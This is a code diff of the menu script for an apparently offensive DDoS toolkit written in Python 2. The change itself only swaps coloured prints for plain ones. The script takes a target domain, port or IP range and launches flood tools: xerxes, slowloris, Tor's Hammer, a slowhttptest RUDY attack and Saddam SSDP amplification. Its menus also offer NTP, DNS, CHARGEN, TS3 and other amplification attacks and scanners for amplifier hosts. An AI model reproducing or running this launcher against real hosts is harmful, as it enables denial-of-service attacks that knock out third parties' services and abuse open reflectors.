@@ -2,7 +2,6 @@
 
 import os
 import subprocess
-from termcolor import colored
 import sys
 from colors import *
 try:
@@ -14,12 +13,12 @@ try:
 		file = open("Banner/banner", "r") 	#Stupid
 		sys.stdout.write(GREEN)
 		print file.read()			#Banner
-		
-		print colored("    1:.","blue"), colored("DDoS Attacks\n","white")
+
+		print ('1.DDoS Attacks\n')
 		sys.stdout.write(BOLD)
-		print colored("    99:.","red"), colored("Quit\n","white")
+		print('99.Quit\n')
 		sys.stdout.write(BOLD)
-		user_input_menu=input( colored("    $: ","grey"))
+		user_input_menu=input()
 
 		############ DoS Attacks #################
 
@@ -35,29 +34,29 @@ try:
 				##################### Dos Options ##########
 				print(" ")
 				sys.stdout.write(BOLD)
-				print colored("     1:.","blue"), colored("TCP Connection Flood","white")
+				print ('1.TCP Connection Flood')
 				sys.stdout.write(BOLD)
-				print colored("     2:.","blue"), colored("HTTP Attacks","white")
+				print ('2.HTTP Attacks')
 				sys.stdout.write(BOLD)
-				print colored("     3:.","blue"), colored("NTP AMP Attack","white")
+				print ('3.NTP AMP Attack')
 				sys.stdout.write(BOLD)
-				print colored("     4:.","blue"), colored("DNS AMP Attack","white")
+				print ('4.DNS AMP Attack')
 				sys.stdout.write(BOLD)
-				print colored("     5:.","blue"), colored("SSDP AMP Attack","white")
+				print ('5.SSDP AMP Attack')
 				sys.stdout.write(BOLD)
-				print colored("     6:.","blue"), colored("DOMINATE","white")
+				print ('6.DOMINATE')
 				sys.stdout.write(BOLD)
-				print colored("     7:.","blue"), colored("CHARGEN AMP Attacks","white")
+				print ('7.CHARGEN AMP Attacks')
 				sys.stdout.write(BOLD)
-				print colored("     8:.","blue"), colored("SUDP AMP Attack","white")
+				print ('8.SUDP AMP Attack')
 				sys.stdout.write(BOLD)
-				print colored("     9:.","blue"), colored("QUAKE AMP Attacks","white")
+				print ('9.QUAKE AMP Attacks')
 				sys.stdout.write(BOLD)
-				print colored("     10:.","blue"), colored("TS3 AMP Attacks\n","white")
+				print ('10.TS3 AMP Attacks\n')
 				sys.stdout.write(BOLD)
-				print colored("     99:.","red"), colored("Go Back\n","white")
+				print ('99.Go Back\n')
 				sys.stdout.write(BOLD)
-				user_input1=input( colored("     $: ","grey"))
+				user_input1=input()
 
 				############################################
 
@@ -68,11 +67,11 @@ try:
 					sys.stdout.write(GREEN)
 					print file.read()
 					sys.stdout.write(BOLD)
-					print colored("\n     1:.","blue"),colored(" XerXes\n","white")
+					print ('1.XerXes\n')
 					sys.stdout.write(BOLD)
-					print colored("     99:.","red"), colored("Go Back\n","white")
+					print ('99.Go Back\n')
 					sys.stdout.write(BOLD)
-					user_input_TcpConnectionFlood=input(colored("     $: ","grey"))
+					user_input_TcpConnectionFlood=input()
 					if user_input_TcpConnectionFlood==1:
 
 						while True:
@@ -84,7 +83,7 @@ try:
 							Port=raw_input("     Port: ")
 							subprocess.call(['./Dos_Attacks/xerxes/xerxes',Domain, Port])
 							break
-					
+
 					if user_input_TcpConnectionFlood==99:
 						os.system("clear")
 						break
@@ -98,16 +97,16 @@ try:
 						sys.stdout.write(GREEN)	#Stupid
 						print file.read()
 						sys.stdout.write(BOLD)
-						print colored("     1:.","blue"),colored(" Slowloris","white")
+						print ('1.Slowloris')
 						sys.stdout.write(BOLD)
-						print colored("     2:.","blue"),colored(" Tors Hammer","white")
+						print ('2.Tors Hammer')
 						sys.stdout.write(BOLD)
-						print colored("     3:.","blue"),colored(" SlowHTTPTest\n","white")
-						
+						print ('3.SlowHTTPTest\n')
+
 						sys.stdout.write(BOLD)
-						print colored("     99:.","red"), colored("Go Back\n","white")
+						print ('99.Go Back\n')
 						sys.stdout.write(BOLD)
-						user_input_HTTPAttacks=input(colored("     $:","grey"))
+						user_input_HTTPAttacks=input()
 
 						if user_input_HTTPAttacks==99:
 							os.system("clear")
@@ -123,7 +122,7 @@ try:
 							file = open("Banner/slowloris", "r") 	#Stupid
 							sys.stdout.write(GREEN)
 							print file.read()
-							print colored("slowloris attack is about to start","red")
+							print ('slowloris attack is about to start')
 							Domain_s=raw_input("   Domain: ")
 							subprocess.call(["perl","Dos_Attacks/slowloris/slowloris.pl","-dns",Domain_s])
 							break
@@ -146,7 +145,7 @@ try:
 								file = open("Banner/rudy", "r") 
 								sys.stdout.write(GREEN)
 								print file.read()
-								print colored("\n     RUDY Attack using SLOWHTTPTEST Dos Tool !!!\n","white")
+								print ('RUDY Attack using SLOWHTTPTEST Dos Tool !!!')
 								connections_rudy=raw_input("     Connections(1000): ")
 								followup_sec_rudy=raw_input("     FollowUp Seconds(110): ")
 								connections_per_second_rudy=raw_input("     Connections Per Second(200): ")
@@ -164,15 +163,15 @@ try:
 					sys.stdout.write(YELLOW) 	#Stupid
 					print file.read()
 					sys.stdout.write(BOLD)
-					print colored("     1:. ","blue"),colored("NTP Amplification Attack","white")
+					print ('1.NTP Amplification Attack')
 					sys.stdout.write(BOLD)
-					print colored("     2:. ","blue"),colored("NTP AMP SCAN","white")
+					print ('2.NTP AMP SCAN')
 					sys.stdout.write(BOLD)
-					print colored("     3:. ","blue"),colored("Callculate AMP Factor\n","white")
+					print ('3.Callculate AMP Factor\n')
 					sys.stdout.write(BOLD)
-					print colored("     99:.","red"), colored("Go Back\n","white")
+					print ('99.Go Back\n')
 					sys.stdout.write(BOLD)
-					user_input_NTP=input(colored("     $: ","grey"))
+					user_input_NTP=input()
 					while True:
 						if user_input_NTP==99:
 							os.system("clear")
@@ -184,7 +183,7 @@ try:
 							sys.stdout.write(YELLOW)	#----------> DDoS Banner
 							print file.read()
 							sys.stdout.write(BOLD)
-							print colored("\n     Priv8 NTP SCANNER (AMP SCAN) \n","white")
+							print ('Priv8 NTP SCANNER (AMP SCAN)')
 							sys.stdout.write(BOLD)
 							ip_range_start=raw_input("     IP Range Start: ")
 							sys.stdout.write(BOLD)
@@ -230,15 +229,15 @@ try:
 					sys.stdout.write(GREEN)	#Stupid
 					print file.read()
 					sys.stdout.write(BOLD)
-					print colored("     1:. ","blue"),colored("DNS Amplification Attack","white")
+					print ('1.DNS Amplification Attack')
 					sys.stdout.write(BOLD)
-					print colored("     2:. ","blue"),colored("DNS AMP SCAN","white")
+					print ('2.DNS AMP SCAN')
 					sys.stdout.write(BOLD)
-					print colored("     3:.","blue"),colored(" Callculate AMP Factor\n","white")
+					print ('3.Callculate AMP Factor\n')
 					sys.stdout.write(BOLD)
-					print colored("     99:.","red"), colored("Go Back\n","white")
+					print ('99.Go Back\n')
 					sys.stdout.write(BOLD)
-					user_input_DNS=input(colored("     $: ","grey"))
+					user_input_DNS=input()
 					while True:
 						if user_input_DNS==99:
 							os.system("clear")
@@ -300,7 +299,7 @@ try:
 						amp_file_ssdp=raw_input("     AMP File: ")
 						sys.stdout.write(BOLD)
 						subprocess.call(["./Dos_Attacks/Saddam/Saddam.py",target_ssdp,"-p",amp_file_ssdp])
-					
+
 				#########################################
 				elif user_input1==6: #------> DOMINATE
 					while True:
@@ -328,11 +327,11 @@ try:
 						sys.stdout.write(GREEN)	#Stupid
 						print file.read()
 						sys.stdout.write(BOLD)
-						print colored("     1:.","blue"),colored(" CHARGEN AMP ATTACK")
+						print ('1.CHARGEN AMP ATTACK')
 						sys.stdout.write(BOLD)
-						print colored("     2:.","blue"),colored("CHARGEN AMP SCAN\n","white")
+						print ('2.CHARGEN AMP SCAN\n')
 						sys.stdout.write(BOLD)
-						print colored("     99:.","red"),colored("Go Back","white")
+						print ('99.Go Back')
 
 						user_input_chargen=input(colored("     $: ","grey"))
 						while True:
@@ -428,13 +427,13 @@ try:
 						sys.stdout.write(GREEN)	#Stupid
 						print file.read()
 						sys.stdout.write(BOLD)
-						print colored("\n     1:.","blue"),colored(" TS3 AMP Attack","white")
+						print ('1.TS3 AMP Attack')
 						sys.stdout.write(BOLD)
-						print colored("     2:.","blue"),colored(" TS3 AMP Scan\n","white")
+						print ('2.TS3 AMP Scan\n')
 						sys.stdout.write(BOLD)
-						print colored("     99:.","red"),colored("Go Back\n","white")
+						print ('99.Go Back\n')
 						sys.stdout.write(BOLD)
-						user_input_ts3=input(colored("     $:","grey"))
+						user_input_ts3=input()
 						if user_input_ts3==1:
 							os.system("clear")
 							file = open("Banner/TS3-atck", "r")
@@ -470,7 +469,7 @@ try:
 							scan_delay_in_ms_ts3=raw_input("     SCAN DELAY IN MS: ")
 							sys.stdout.write(BOLD)
 							subprocess.call(["./Dos_Attacks/ts3/ts3scan",ip_range_start_ts3,ip_range_end_ts3,outfile_ts3_scan,threads_ts3_scan,scan_delay_in_ms_ts3])
-							
+
 
 						elif user_input_ts3==99:
 							os.system("clear")
@@ -492,7 +491,7 @@ try:
 
 		elif user_input_menu==99: 
 			sys.stdout.write(BOLD)
-			print colored("\n                       THANKS 4 USING THIS TOOL!! \n ","white")
+			print ('THANKS 4 USING THIS TOOL!!')
 			break
 
 except KeyboardInterrupt:
